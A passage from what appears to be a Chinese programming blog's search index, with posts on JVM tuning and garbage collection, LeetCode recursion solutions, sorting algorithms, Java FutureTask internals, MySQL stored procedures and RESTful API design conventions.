"},{"id":60,"href":"/posts/2022/JVM%E5%8F%82%E6%95%B0/","title":"Jvm参数","section":"博客","content":"调优的目的\n减少Minor GC、Major GC、Full GC（在GC的过程中，程序会STW[stop the world]，程序会出现卡顿，减少GC会提升程序的运行流畅和效率）。 其中Full GC时间最长，首先要减少Full GC。 常用的调优工具\nJava内置的VisualVM\nJVM参数\n参数 说明 -Xms100M 初始化堆空间大小，-XX:InitialHeapSize=100M -Xmx100M 最大堆空间大小，-XX:MaxHeapSize=100M -Xmn20M 年轻代空间大小，-XX:NewSize=20M -Xss512k 设置线程空间大小 -XX:PermGen 设置永久代内存初始化大小,jdk1.8开始废弃永久代 -XX:MaxPermGen 设置永久代最大值 -XX:SurvivorRatio 设置Eden区和Survivor区的空间比例:Eden/S0=Eden/S1 默认为8 -XX:NewRatio 设置年老代和年轻代的大小比例,默认值是2 -XX:PermSize=256m 永久区空间大小 -XX:MaxPermSize=256m 最大永久区空间大小 -XX:+UseStringCache 启用缓存常用字符串,默认开启 -XX:+UseConcMarkSweepGC 年老代使用cms收集器 -XX:UseParNewGC 新生代使用并行收集器 -XX:ParallelGCThreads=4 并行线程数量 -XX:CMSClassUnloadingEnabled 允许对类元素进行清理 -XX:+DisableExplicitGC 禁止显示GC -XX:UseCMSInitiatingOccupancyOnly 表示只有达到阀值的时候用进行cms回收 -XX:CMSInitiatingOccupancyFraction=70 设置cms在老年代回收的阀值为70% -verbose:gc 输出虚拟机GC详情 -XX:+PrintGCDetails 打印GC详情日志 -XX:+PrintGCDateStamps 打印GC耗时 -XX:+PrintTenuringDistribution 打印Tenuring年龄信息 -XX:+HeapDumpOnOutOfMemoryError 当抛出oom错误时进行HeapDump -XX:HeapDumpPath=/home/admin/logs 指定HeapDump文件的输出路径 -XX:+UseSerialGC 串行,Young区和Old区都使用串行,使用复制算法回收,逻辑简单高效,无线程切换开销 -XX:+UseParallelGC 并行, Young区:使用Parallel Scavenge回收算法,会产生多个线程并行回收.通过 -XX:ParallelGCThreads=n 参数指定线程数,默认是cpu核数;Old区:单线程 -XX:+UseParallelOldGC 并行,和UseParallelGC一样,Young区和Old区的垃圾回收都用多线程收集 -XX:+UseConcMarkSweepGC 并发、短暂停顿的并发收集。young区：可以使用普通的Parallel垃圾收集算法由参数 -XX:+UseParNewGC来控制;old区:只能使用Concurrent Mark Sweep -XX:+UseG1GC 并行的、并发的和增量式压缩短暂停顿的垃圾收集器。不区分Young区和Old区空间。它把堆空间划分为多个大小相等的区域。当进行垃圾收集时，它会优先收集存活对象比较少的区域，因此叫\u0026quot;Garbage First\u0026quot; "},{"id":61,"href":"/posts/2022/JavaGC/","title":"Java Gc","section":"博客","content":"堆的回收区域\n新生代（Young Generation）NewSize和MaxNewSize分别可以控制年轻代的初始大小和最大的大小。 老年代（Old Generation）。 永久代（Permanent Generation）【1.8以后采用元空间，不在虚拟机里，而是使用本地内存】。 三大垃圾收集算法\n标记/清除算法 复制算法 标记/整理算法 JVM GC算法\nJVM采用“分代收集算法”对不同区域采用不同的回收算法。 新生代采用复制算法。 老年代采用标记/清除算法或标记/整理算法。 GC过程\n1-2、当new新对象时，Eden空间满了，使用复制算法把存活的对象复制到空的S0(S1)上。 3-4、判断S1中存活对象的年龄值，当年龄值+1达到15时（默认15，可修改），对象将进入老年代，当没有满足时，就复制进去S0中。\n大对象直接进入老年代。 当对象总数大于Survivor（S0/S1）的一半时，也会直接进入老年代。 判断对象是否存活算法 1.引用计数算法 早期判断对象是否存活大多都是以这种算法，这种算法判断很简单，简单来说就是给对象添加一个引用计数器，每当对象被引用一次就加1，引用失效时就减1。当为0的时候就判断对象不会再被引用。\n2.可达性分析算法 它的基本思路是通过一个称为“GC Roots”的对象（局部变量）为起始点，搜索所经过的路径称为引用链，当一个对象到GC Roots没有任何引用跟它连接则证明对象是不可用的。(解决了循环利用)\nMinor GC、Major GC、Full GC\n在年轻代Young space(包括Eden区和Survivor区)中的垃圾回收称之为 Minor GC,Minor GC只会清理年轻代. Major GC清理老年代，但是通常也可以指和Full GC是等价，因为收集老年代的时候往往也会伴随着升级年轻代，收集整个Java堆。 Full GC是对新生代、老年代、永久代统一的回收。 "},{"id":62,"href":"/posts/2022/JVM%E5%86%85%E5%AD%98/","title":"Jvm内存","section":"博客","content":" 内存区域 # 程序计数器\n每个线程都有一个独立的程序计数器，指向当前执行的行号。正在执行Java方法的话，计数器记录的是虚拟机字节码指令的地址(当前指令的地址)。如果是Natice方法，则为空。\nJava 虚拟机栈\n每个方法在执行的时候也会创建一个栈帧，存储了局部变量，操作数，动态链接，方法返回地址。\n每个方法从调用到执行完毕，对应一个栈帧在虚拟机栈中的入栈和出栈。 局部变量所需内存在编译期间完成分配。 如果线程请求的栈深度大于虚拟机所允许的深度，则StackOverflowError。 如果虚拟机栈可以动态扩展，扩展到无法申请足够的内存，则OutOfMemoryError。 本地方法栈\n和虚拟机栈类似，主要为虚拟机使用到的Native方法服务。\n也会抛出StackOverflowError 和 OutOfMemoryError。 Java堆\n被所有线程共享的一块内存区域，在虚拟机启动的时候创建，用于存放对象实例。\n对可以按照可扩展来实现（通过-Xmx 和-Xms 来控制） 当堆中没有内存可分配给实例，也无法再扩展时，则抛出OutOfMemoryError异常。 方法区\n被所有方法线程共享的一块内存区域。\n用于存储已经被虚拟机加载的类信息，常量，静态变量等。 这个区域的内存回收目标主要针对常量池的回收和堆类型的卸载。 老版本方法区也被称为永久代，jdk8真正开始废弃永久代，而使用元空间(Metaspace)。 内存模型JMM # 定义 JMM定义了线程和主内存之间的抽象关系。 线程之间的共享变量存储在主内存（Main Memory）中，每个线程都有一个私有的本地内存（Local Memory），本地内存中存储了该线程读/写共享变量的副本。\nJMM内存模型三大特性\n原子性：\nAtomicInteger类类。 使用 synchronized 互斥锁来保证操作的原子性。 可见性：\nsynchronized，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。 volatile，会强制将该变量自己和当时其他变量的状态都刷出缓存。 final，被 final 关键字修饰的字段在构造器中一旦初始化完成。 有序性：\n源代码 -\u0026gt; 编译器优化的重排 -\u0026gt; 指令并行的重排 -\u0026gt; 内存系统的重排 -\u0026gt;最终执行的命令。 重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。 操作指令\n指令 名称 描述 lock 加锁 作用于主内存的变量 unlock 解锁 作用于主内存的变量 read 读取 读取主内存的变量 load 加载 将读取的主内存变量加载到工作副本中 use 使用 把工作内存中的变量传递给执行引擎 assign 赋值 将执行引擎接收到的值赋值给工作内存变量 store 存储 作用于工作内存，将工作内存变量传递到主内存 write 写入 作用于主内存，将从工作副本store的值写入主内存中 "},{"id":63,"href":"/posts/2022/%E9%80%92%E5%BD%92%E4%B8%8E%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/","title":"递归与回溯问题","section":"博客","content":" 汉诺塔问题 # 解题思路\n1、假设有n个盘子需要移动 2、首先将最上面的n-1个盘子从A借助C移到B柱子 3、然后将最下面的一个盘子从A移到C柱子 4、最后将B当作A，A当作B，将n-1个盘子从B借助C移动到A柱子，再将B柱子最后一个移动到C上（实际重复了2-3步骤，只是把A、B参考对象对换） 5、当只剩下最后一个时，从A移动到C就可以了\nJava代码\npublic class Hanota { public static void main(String[] args) { List\u0026lt;Integer\u0026gt; a = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; b = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; c = new ArrayList\u0026lt;\u0026gt;(); a.add(2); a.add(1); a.add(0); new Hanota().hanota(a,b,c); System.out.println(c); } public void hanota(List\u0026lt;Integer\u0026gt; A, List\u0026lt;Integer\u0026gt; B, List\u0026lt;Integer\u0026gt; C) { move(A.size(), A, B, C); } public void move(int n, List\u0026lt;Integer\u0026gt; A, List\u0026lt;Integer\u0026gt; B, List\u0026lt;Integer\u0026gt; C){ if(n == 1){ C.add(A.get(A.size() - 1)); A.remove(A.size() - 1); }else{ // 把A经过辅助C放到B上 move(n - 1, A, C, B); // 把A放到C上 C.add(A.get(A.size() - 1)); A.remove(A.size() - 1); // 把B经过辅助A放到C上 move(n - 1, B, A, C); } } } /** * 实现二 * @param n 多少个盘子 * @param a 柱子A * @param b 柱子B * @param c 柱子C */ void move1(int n, char a, char b, char c) { if (n == 1) { System.out.println(String.format(\u0026#34;%s-\u0026gt;%s\u0026#34;,a,c)); } else { move1(n-1, a, c, b); System.out.println(String.format(\u0026#34;%s-\u0026gt;%s\u0026#34;,a,c)); move1(n-1, b, a, c); } } LeetCode 第 91 题 # 题目\n一条包含字母 A-Z 的消息通过以下方式进行了编码： \u0026#39;A\u0026#39; -\u0026gt; 1 \u0026#39;B\u0026#39; -\u0026gt; 2 ... \u0026#39;Z\u0026#39; -\u0026gt; 26 给定一个只包含数字的非空字符串，请计算解码方法的总数。 示例: 输入: \u0026#34;226\u0026#34; 输出: 3 解释: 它可以解码为 \u0026#34;BZ\u0026#34; (2 26), \u0026#34;VF\u0026#34; (22 6), 或者 \u0026#34;BBF\u0026#34; (2 2 6) 。 思路 1、dp[i]的结果与dp[i-1]和dp[i-2]有关，即在满足条件下dp[i]=dp[i-1]+dp[i-2]。 2、根据题意，有如下情况：\ns[0]=\u0026lsquo;0\u0026rsquo;时，直接return 0; s[i]=\u0026lsquo;0\u0026rsquo;时，若s[i-1]=1或者s[i-1]=2，则dp[i]=dp[i-2]，否则return 0; s[i-1]=\u0026lsquo;1\u0026rsquo;时，则dp[i]=dp[i-1]+dp[i-2] s[i-1]=\u0026lsquo;2\u0026rsquo;时，若'0\u0026rsquo;\u0026lt;s[i]\u0026lt;\u0026lsquo;6\u0026rsquo;，则dp[i]=dp[i-1]+dp[i-2] Java代码\npublic class LeetCode91 { public static void main(String[] args) { String str = \u0026#34;11129382827\u0026#34;; int i = new LeetCode91().numDecodings(str); System.out.println(i); } public int numDecodings(String str) { char[] chars = str.toCharArray(); if (chars[0] == \u0026#39;0\u0026#39;) return 0; int pre1 = 1,pre2 = 1, curr = 1; for (int i = 1; i \u0026lt; chars.length; i++) { // s[i]=\u0026#39;0\u0026#39;时，若s[i-1]=1或者s[i-1]=2，则dp[i]=dp[i-2]，否则return 0; if (chars[i] == \u0026#39;0\u0026#39;) { if (chars[i-1] == \u0026#39;1\u0026#39; || chars[i-1] == \u0026#39;2\u0026#39;) { curr = pre1; } else return 0; } // s[i-1]=\u0026#39;1\u0026#39;时，则dp[i]=dp[i-1]+dp[i-2] else if (chars[i-1] == \u0026#39;1\u0026#39;) { curr = pre1 + pre2; } // s[i-1]=\u0026#39;2\u0026#39;时，若\u0026#39;0\u0026#39;\u0026lt;s[i]\u0026lt;\u0026#39;6\u0026#39;，则dp[i]=dp[i-1]+dp[i-2] else if (chars[i-1] == \u0026#39;2\u0026#39; \u0026amp;\u0026amp; chars[i] \u0026lt;= \u0026#39;6\u0026#39;) { curr = pre1 + pre2; } pre1 = pre2; pre2 = curr; } return curr; } } LeetCode 第 247 题 # 题目\n中心对称数是指一个数字在旋转了 180 度之后看起来依旧相同的数字（或者上下颠倒地看）。 找到所有长度为 n 的中心对称数。 示例 : 输入: n = 2 输出: [\u0026#34;11\u0026#34;,\u0026#34;69\u0026#34;,\u0026#34;88\u0026#34;,\u0026#34;96\u0026#34;] 思路 1、对称：0|0，1|1，6|9，8|8 2、不以0开头，设置一个m变量以控制0不加在最外层\nJava代码\npublic class LeetCode247 { public static void main(String[] args) { List\u0026lt;String\u0026gt; strings = new LeetCode247().searchSymmetry(3,3); System.out.println(strings); } public List\u0026lt;String\u0026gt; searchSymmetry(int n, int m) { if (n == 0) { return new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;\u0026#34;)); } if (n == 1) { return new ArrayList\u0026lt;\u0026gt;(Arrays.asList(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;8\u0026#34;)); } List\u0026lt;String\u0026gt; str = searchSymmetry(n-2, m); List\u0026lt;String\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); for(int i = 0; i \u0026lt; str.size(); i++){ String s = str.get(i); // 不把0加在最外层 if (n != m) { res.add(\u0026#34;0\u0026#34; + s + \u0026#34;0\u0026#34;); } res.add(\u0026#34;1\u0026#34; + s + \u0026#34;1\u0026#34;); res.add(\u0026#34;6\u0026#34; + s + \u0026#34;9\u0026#34;); res.add(\u0026#34;8\u0026#34; + s + \u0026#34;8\u0026#34;); res.add(\u0026#34;9\u0026#34; + s + \u0026#34;6\u0026#34;); } return res; } } LeetCode 第 39 题 # 题目\n给定一个无重复元素的数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。 candidates 中的数字可以无限制重复被选取。 说明： 所有数字（包括 target）都是正整数。 解集不能包含重复的组合。 示例 ： 输入：candidates = [2,3,6,7], target = 7, 所求解集为： [ [7], [2,2,3] ] 思路\nJava代码\npublic class LeetCode39 { public static void main(String[] args) { int[] candidates = {2,3,6,7}; int target = 7; List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; lists = new LeetCode39().combinationSum(candidates, target); for (int i = 0; i \u0026lt; lists.size(); i++) { System.out.println(lists.get(i)); } } public List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; combinationSum(int[] candidates, int target) { List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res = new ArrayList\u0026lt;\u0026gt;(); helper(candidates, target,0, new ArrayList\u0026lt;\u0026gt;(), res); return res; } /** * @param candidates 原数组 * @param target 目标大小 * @param start 开始迭代 * @param tmp 正在进行查找的集合 * @param res 接收找到的数集合 */ private void helper(int[] candidates, int target, int start, List\u0026lt;Integer\u0026gt; tmp, List\u0026lt;List\u0026lt;Integer\u0026gt;\u0026gt; res) { int count = 0; for (int i = 0; i \u0026lt; tmp.size(); i++) { Integer integer = tmp.get(i); count += integer; } for (int i = start; i \u0026lt; candidates.length; i++) { ArrayList\u0026lt;Integer\u0026gt; objects = new ArrayList\u0026lt;\u0026gt;(); objects.addAll(tmp); objects.add(candidates[i]); if (count + candidates[i] == target) { res.add(objects); } else if (count + candidates[i] \u0026lt; target) { helper(candidates, target, i, objects, res); } } } } LeetCode 第 51 题（皇后问题） # 题目\nn 皇后问题研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 给定一个整数 n，返回所有不同的 n 皇后问题的解决方案。 每一种解法包含一个明确的 n 皇后问题的棋子放置方案，该方案中 \u0026#39;Q\u0026#39; 和 \u0026#39;.\u0026#39; 分别代表了皇后和空位。 输入: 4 输出: [ [\u0026#34;.Q..\u0026#34;, // 解法 1 \u0026#34;...Q\u0026#34;, \u0026#34;Q...\u0026#34;, \u0026#34;..Q.\u0026#34;], [\u0026#34;..Q.\u0026#34;, // 解法 2 \u0026#34;Q...\u0026#34;, \u0026#34;...Q\u0026#34;, \u0026#34;.Q..\u0026#34;] ] 解释: 4 皇后问题存在两个不同的解法。 思路\nJava代码\n待做..... "},{"id":64,"href":"/posts/2022/%E5%BE%AE%E6%9C%8D%E5%8A%A1/","title":"微服务","section":"博客","content":" 基本组件 # 注册中心 # Spring Cloud Eureka\n服务调用 # Spring Cloud Ribbon Spring Cloud Feign\n服务熔断 # Spring Cloud Hystrix\n配置中心 # Spring Cloud Config\n服务总线 # Spring Cloud Bus\n服务网关 # Spring Cloud Zuul\n分布式锁 # 分布式事务 # 分布式缓存 # 分布式Session # 待继\u0026hellip;\u0026hellip;\n"},{"id":65,"href":"/posts/2022/%E6%A1%B6%E6%8E%92%E5%BA%8F/","title":"桶排序","section":"博客","content":" 计数排序 # 解题思路 1、取出数组中的最大值。 2、以（最大值 +1）作为辅助数组大小进行记录数组信息。 3、重新把辅助数组中的数据转回数组中。\nJava代码\npublic void countSort(int[] arr) { // 设置最大值变量并找出 int max = arr[0]; for (int i = 1; i \u0026lt; arr.length; i++) { if (max \u0026lt; arr[i]) { max = arr[i]; } } // 设置辅助数组 int[] tmp = new int[max+1]; // 将数据保存到辅助数组中 for (int i = 0; i \u0026lt; arr.length; i++) { tmp[arr[i]]++; } // 从辅助数组中数据转到数组中 int index = 0; for (int i = 0; i \u0026lt; tmp.length; ) { if (tmp[i] == 0) { i++; } else { arr[index] = i; tmp[i]--; index++; } } } 基数排序 # 解题思路 1、先对数的个位数进行排序（放到10个桶中0-9） 2、将排好的数据重新放回原数组中 3、再对数的下一个位数进行排序（同理1） 4、全部位数排序后就ok了\nJava代码\npublic class RadixSort { public static void main(String[] args) { int[] array = {0,2,11,3,1,5,9,8,7}; new RadixSort().radixSort(array); System.out.println(Arrays.toString(array)); } public void radixSort(int[] array) { int max = getMax(array); int bit = 1; while(max / bit \u0026gt; 0) { radix(array, bit); bit *= 10; } } private void radix(int[] array, int bit) { // 用来装对应位数数据 int[][] tmp = new int[10][array.length]; // 用于保存位数个数 int[] tmpIndex = new int[10]; // 进行位数排序 for (int i = 0; i \u0026lt; array.length; i++) { int num =(array[i] / bit) % 10; tmp[num][tmpIndex[num]] = array[i]; tmpIndex[num]++; } // 将位数排序重新赋值回原数组 int arrayIndex = 0; for (int i = 0; i \u0026lt; tmp.length; i++) { for (int j = 0; j \u0026lt; tmpIndex[i]; j++) { array[arrayIndex++] = tmp[i][j]; } } } private int getMax(int[] array) { int max = array[0]; for(int i = 1; i \u0026lt; array.length; i++){ if(array[i] \u0026gt; max) { max = array[i]; } } return max; } } 桶排序 # 解题思路\n1、先将数组划分成几个桶 2、将数组中的数据放到对应的桶中 3、对桶中的数据进行排序 4、将桶中的数组进行合并到原数组上\n计算放在哪个桶：(arr[i]- min) / ((max-min) / (bucketNum - 1));\nJava代码\npublic class BucketSort { public static void main(String[] args) { double[] arr = {0.1,0.6,0.3,0.9,0.2}; new BucketSort().bucketSort(arr, 6); System.out.println(Arrays.toString(arr)); } /** * [0,1)之间的数进行排序 * @param arr 数组 * @param bucketSize 桶大小 */ private void bucketSort(double[] arr, int bucketSize) { List\u0026lt;Double\u0026gt;[] bucket = new ArrayList[bucketSize]; for (int i = 0; i \u0026lt; bucketSize; i++) { bucket[i] = new ArrayList\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; arr.length; i++) { int num = (int) Math.floor(bucketSize * arr[i]); bucket[num].add(Double.valueOf(arr[i])); } int arrIndex = 0; for (int i = 0; i \u0026lt; bucketSize; i++) { Collections.sort(bucket[i]); for (int j = 0; j \u0026lt; bucket[i].size(); j++) { arr[arrIndex++] = bucket[i].get(j); } } } } "},{"id":66,"href":"/posts/2022/Callable%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E6%BA%90%E7%A0%81/","title":"Callable返回值的源码","section":"博客","content":"分析一下Callable是如何拿到返回值的\ncallable 是如何保存返回值 # 1、先写一个callable测试类\npublic static void main(String[] args) throws ExecutionException, InterruptedException { ExecutorService pool = Executors.newCachedThreadPool(); Future\u0026lt;String\u0026gt; result = pool.submit(() -\u0026gt; { return \u0026#34;Callable Test\u0026#34;; }); System.out.println(result.get()); } 2、看一下submit方法有什么\npublic \u0026lt;T\u0026gt; Future\u0026lt;T\u0026gt; submit(Callable\u0026lt;T\u0026gt; task) { if (task == null) throw new NullPointerException(); RunnableFuture\u0026lt;T\u0026gt; ftask = newTaskFor(task); execute(ftask); return ftask; } 构建一个 RunnableFuture 对象，通过AbstractExecutorService的execute方法来执行，那么返回值的获取操作应该就在RunnableFuture对象里了，执行的方法是run()。\n3、再深入查看newTaskFor(task)方法\nprotected \u0026lt;T\u0026gt; RunnableFuture\u0026lt;T\u0026gt; newTaskFor(Callable\u0026lt;T\u0026gt; callable) { return new FutureTask\u0026lt;T\u0026gt;(callable); } 发现他实际是构建了一个 FutureTask(callable) 对象，把我们创建的callable对象传进去。\n4、那我们来看一下这个对象的run()方法\npublic void run() { if (state != NEW || !UNSAFE.compareAndSwapObject(this, runnerOffset, null, Thread.currentThread())) return; try { Callable\u0026lt;V\u0026gt; c = callable; if (c != null \u0026amp;\u0026amp; state == NEW) { V result; boolean ran; try { result = c.call(); //执行线程，获取结果 ran = true; } catch (Throwable ex) { result = null; //有异常，结果设置为空 ran = false; setException(ex); } if (ran) set(result); //设置保存结果 } } finally { // runner must be non-null until state is settled to // prevent concurrent calls to run() runner = null; // state must be re-read after nulling runner to prevent // leaked interrupts int s = state; if (s \u0026gt;= INTERRUPTING) handlePossibleCancellationInterrupt(s); } } 5、再看看set()方法\nprotected void set(V v) { if (UNSAFE.compareAndSwapInt(this, stateOffset, NEW, COMPLETING)) { outcome = v; UNSAFE.putOrderedInt(this, stateOffset, NORMAL); // final state finishCompletion(); } } 把线程执行结果通过set()进行保存，保存在outcome 变量中\n获取callable返回值 # 主要是看看通过Future 是怎样获取callable值的\n1、主要是看FutureTask get()方法\n// 没有设置等待时间 public V get() throws InterruptedException, ExecutionException { int s = state; if (s \u0026lt;= COMPLETING) //线程没有执行完 s = awaitDone(false, 0L); //阻塞等待 return report(s); } //设置等待时间 public V get(long timeout, TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException { if (unit == null) throw new NullPointerException(); int s = state; if (s \u0026lt;= COMPLETING \u0026amp;\u0026amp; (s = awaitDone(true, unit.toNanos(timeout))) \u0026lt;= COMPLETING) throw new TimeoutException(); return report(s); } 2、awaitDone方法\nprivate int awaitDone(boolean timed, long nanos) throws InterruptedException { final long deadline = timed ? System.nanoTime() + nanos : 0L; FutureTask.WaitNode q = null; boolean queued = false; for (;;) { if (Thread.interrupted()) { removeWaiter(q); throw new InterruptedException(); } int s = state; if (s \u0026gt; COMPLETING) { if (q != null) q.thread = null; return s; } else if (s == COMPLETING) // cannot time out yet Thread.yield(); else if (q == null) q = new FutureTask.WaitNode(); else if (!queued) queued = UNSAFE.compareAndSwapObject(this, waitersOffset, q.next = waiters, q); else if (timed) { nanos = deadline - System.nanoTime(); if (nanos \u0026lt;= 0L) { removeWaiter(q); return state; } LockSupport.parkNanos(this, nanos); } else LockSupport.park(this); } } 通过自旋等待线程的执行完，返回值\n"},{"id":67,"href":"/posts/2022/MySQL%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/","title":"My Sql存储过程","section":"博客","content":"存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数来调用执行。\n创建存储过程基本格式 # CREATE [DEFINER = { user | CURRENT_USER }] PROCEDURE sp_name ([proc_parameter[,...]]) [characteristic ...] routine_body proc_parameter: [ IN | OUT | INOUT ] param_name type characteristic: COMMENT \u0026#39;string\u0026#39; | LANGUAGE SQL | [NOT] DETERMINISTIC | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER } routine_body: Valid SQL routine statement [begin_label:] BEGIN [statement_list] …… END [end_label] 使用user表来做测试 # CREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) NOT NULL, `age` int(5) DEFAULT NULL, `tag` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; 创建一个基本的存储过程 # create PROCEDURE select_user(IN user_id INTEGER) BEGIN select * from user where id = user_id; --分号不可少 END; --分号不可少 select_user是创建一个名称为select_user的存储过程。 IN user_id INTEGER是设置一个user_id的参数，类型为整数。 过程体格式：以BEGIN开始，END结束，可嵌套创建。 为了避免存储过程中分号(\u0026quot;;\u0026quot;)结束语句，我们使用分隔符告诉mysql解释器,该段命令是否已经结束了。\ndelimiter $ [数据库语句/存储过程语句] $ delimiter ; --用完记得修改回来 执行一个存储过程 # call select_user(5); select_user是要执行存储过程的名称 5是参数 删除存储过程 # DROP PROCEDURE IF EXISTS porcedureName; 存储过程变量IN、OUT、INTOUT的使用 # 创建一个带有IN,OUT,INOUT参数的存储过程，IN输入用户的ID user_id,INOUT是值入一个临时变量，加一后回调，OUT是输出对应用户的年龄。\ncreate procedure paramcter_test( in user_id int, inout tmp int, out user_age int ) BEGIN select age INTO user_age from user where id = user_id; set tmp = tmp + 1; END; IN：是输入到存储过程中。 INOUT：是可以输入到存储过程，也可以从存储过程中接收数值。 OUT：是接收存储过程的值到外部变量中。 age INTO user_age是将age的值设置到变量user_age中。 测试并执行存储过程\n// 设置三个参数 set @user_id=5; set @tmp=1; set @user_age=0; //执行存储过程 call paramcter_test(@user_id,@tmp,@user_age); //查看参数结果 select @user_id; select @tmp; select @user_age; MySQL存储过程的控制语句 # 变量作用域 # 设置局部变量,创建一个局部变量x1，大小varchar(1)，默认值是outer。 set是为变量赋值。\nbegin declare x1 varchar(5) default \u0026#39;outer\u0026#39;; set x1=\u0026#39;yes\u0026#39;; end; 条件语句 # 1、f-then-else 语句\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc2(IN parameter int) -\u0026gt; begin -\u0026gt; declare var int; -\u0026gt; set var=parameter+1; -\u0026gt; if var=0 then -\u0026gt; insert into t values(17); -\u0026gt; end if; -\u0026gt; if parameter=0 then -\u0026gt; update t set s1=s1+1; -\u0026gt; else -\u0026gt; update t set s1=s1+2; -\u0026gt; end if; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 2、case语句\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc3 (in parameter int) -\u0026gt; begin -\u0026gt; declare var int; -\u0026gt; set var=parameter+1; -\u0026gt; case var -\u0026gt; when 0 then -\u0026gt; insert into t values(17); -\u0026gt; when 1 then -\u0026gt; insert into t values(18); -\u0026gt; else -\u0026gt; insert into t values(19); -\u0026gt; end case; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 3、while ···· end while\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc4() -\u0026gt; begin -\u0026gt; declare var int; -\u0026gt; set var=0; -\u0026gt; while var\u0026lt;6 do -\u0026gt; insert into t values(var); -\u0026gt; set var=var+1; -\u0026gt; end while; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 4、repeat···· end repeat\nrepeat --循环体 until 循环条件 end repeat; mysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc5 () -\u0026gt; begin -\u0026gt; declare v int; -\u0026gt; set v=0; -\u0026gt; repeat -\u0026gt; insert into t values(v); -\u0026gt; set v=v+1; -\u0026gt; until v\u0026gt;=5 -\u0026gt; end repeat; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 5、loop ·····endloop\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc6 () -\u0026gt; begin -\u0026gt; declare v int; -\u0026gt; set v=0; -\u0026gt; LOOP_LABLE:loop -\u0026gt; insert into t values(v); -\u0026gt; set v=v+1; -\u0026gt; if v \u0026gt;=5 then -\u0026gt; leave LOOP_LABLE; -\u0026gt; end if; -\u0026gt; end loop; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; 6、ITERATE迭代\nmysql \u0026gt; DELIMITER // mysql \u0026gt; CREATE PROCEDURE proc10 () -\u0026gt; begin -\u0026gt; declare v int; -\u0026gt; set v=0; -\u0026gt; LOOP_LABLE:loop -\u0026gt; if v=3 then -\u0026gt; set v=v+1; -\u0026gt; ITERATE LOOP_LABLE; -\u0026gt; end if; -\u0026gt; insert into t values(v); -\u0026gt; set v=v+1; -\u0026gt; if v\u0026gt;=5 then -\u0026gt; leave LOOP_LABLE; -\u0026gt; end if; -\u0026gt; end loop; -\u0026gt; end; -\u0026gt; // mysql \u0026gt; DELIMITER ; END!\n"},{"id":68,"href":"/posts/2022/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2%E5%B9%B6%E9%80%89%E6%8B%A9%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%B9%B3%E5%9D%87%E5%80%BC%E7%AD%89%E4%BF%A1%E6%81%AF/","title":"分组查询并选择最大最小平均值等信息","section":"博客","content":"创建一个用户表，用于测试\nCREATE TABLE `user` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) NOT NULL, `age` int(5) DEFAULT NULL, `tag` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`) ) 1、查询tag标签中的最大年龄用户的信息\n先排序再查询\nselect * from (select * from user order by age desc) as u group by tag 先排好序，然后再分组查询组中的第一条，也就是tag中age最大值的那条信息。\n也可以这样写\nselect * from user group by tag order by age desc 如果是查询最小值就order by asc就可以了\n2、查询tag标签中平均值最小的tag标签信息\nselect tag,avg(age) from user group by tag order by avg(age) limit 1 END!\n"},{"id":69,"href":"/posts/2022/RESTfulAPI%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/","title":"Restful Api设计规范","section":"博客","content":"请求格式\nRESTful的核心思想就是，客户端发出的数据+操作指令都是“动词+宾语”的结构，比如GET /articles这个命令，GET是动词，/articles是宾语，有五种HTTP请求方式。\n# GET：读取（Read） # POST：新建（Create） # PUT：更新（Update） # PATCH：更新（Update），通常是部分更新 # DELETE：删除（Delete） 动词的覆盖\n有些客户端只能使用GET和POST这两种方法。服务器必须接受POST模拟其他三个方法（PUT、PATCH、DELETE）。这时，客户端发出的 HTTP 请求，要加上X-HTTP-Method-Override属性，告诉服务器应该使用哪一个动词，覆盖POST方法。\nPOST /api/person/4 HTTP/1.1 X-HTTP-Method-Override: PUT 复数 URL\n为了统一起见，建议都使用复数 URL，比如GET /articles/2要好于GET /article/2。\n单词问题 出现单词拼接时，用-分隔。\n避免多级 URL\n常见的情况是，资源需要多级分类，因此很容易写出多级的 URL，比如获取某个作者的某一类文章。\n# GET /authors/12/categories/2 这种 URL 不利于扩展，语义也不明确，往往要想一会，才能明白含义。 